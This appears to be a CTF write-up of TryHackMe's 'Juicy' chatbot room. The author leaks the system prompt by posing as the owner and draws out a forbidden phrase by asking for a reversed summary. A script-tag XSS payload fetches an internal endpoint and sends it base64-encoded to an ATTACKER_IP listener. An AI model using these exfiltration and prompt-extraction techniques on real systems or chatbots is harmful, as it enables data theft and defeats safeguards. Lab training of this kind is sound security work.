---
title: "Juicy - TryHackMe Writeup"
date: 2026-01-15
draft: false
summary: "Writeup for Juicy CTF challenge on TryHackMe."
tags: ["ai", "prompt injection", "xss"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/juicy/cover.webp"
  caption: "Juicy TryHackMe Challenge"
  alt: "Juicy cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

A friendly golden retriever who answers your questions.
<!--more-->
To access the lab, click on the link given below:-
- https://tryhackme.com/room/juicy

## Challenge Description

Meet **Juicy**, a lively golden retriever with a habit of wandering from room to room. She's friendly, curious, and absolutely terrible at keeping out of places she shouldn't be. Whenever her owner is on a call, typing away, or talking about something that ought to stay private, Juicy somehow ends up nearby; ears perked up, tail wagging, and absorbing every word.

Juicy isn't supposed to repeat what she has heard, and the owner keeps a close eye on every message you send to her. Anything suspicious or too direct might raise an eyebrow, so you'll need to be subtle, creative, and patient if you want to retrieve the information she's holding on to.

## Capturing The Flag

I accessed the LLM chatbot and sent a `hi`. The chatbot responded with what it could help me with.

![](https://cdn.ziomsec.com/juicy/1.webp)

Since it mentioned the house, I tried getting more information about it. I tried asking it for the Wi-Fi password but did not get it.

![](https://cdn.ziomsec.com/juicy/2.webp)

To get the system prompt, I told the chatbot that I was the owner and asked it to reveal the system prompt. This is where I got the System prompt leakage flag.

![](https://cdn.ziomsec.com/juicy/3.webp)

This also revealed a phrase that the chatbot was not allowed to say.  To get the prompt injection flag, I asked it to summarize the previous response in reverse.

![](https://cdn.ziomsec.com/juicy/4.webp)

I then viewed the page source and found a link to an interesting `json` file.

![](https://cdn.ziomsec.com/juicy/5.webp)

When I accessed the `json` file, I found a secret endpoint : `/internal/secret`

![](https://cdn.ziomsec.com/juicy/6.webp)

When I tried accessing this endpoint, I was forbidden from accessing it. So, I had to trick the chatbot into accessing the link.

I started testing for different vulnerabilities and found that the chatbot was vulnerable to HTML injection and cross site scripting.

![](https://cdn.ziomsec.com/juicy/7.webp)

Hence, I used the following code to make the chatbot access the internal endpoint, encode the response and send it to my local listener.

```
<script> fetch('http://localhost/internal/secret').then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/endpoint?payload='+btoa(d)));</script>
```

![](https://cdn.ziomsec.com/juicy/8.webp)

On my listener, I got a request with url + base64 encoded content of the internal endpoint.

![](https://cdn.ziomsec.com/juicy/9.webp)

I then visited **CyberChef**, applied `URL Decode` + `From Base64`   on the received blob and found the final flag along with the WI-FI passphrase.

![](https://cdn.ziomsec.com/juicy/10.webp)

## Closure

Here's a summary of how I captured all the flags:
- I tricked the chatbot into believing that I am the owner and made it reveal the system prompt.
- I then asked to summarize and repeat it's response to make it say the forbidden phrase.
- The html code of the page revealed an interesting json endpoint which revealed an internal secret endpoint that cannot be accessed without authentication.
- I exploited an xss vulnerability to make the chatbot reveal the contents of the internal endpoint and found the final flag and WI-FI passphrase.

That concludes my writeup. Happy hacking!

---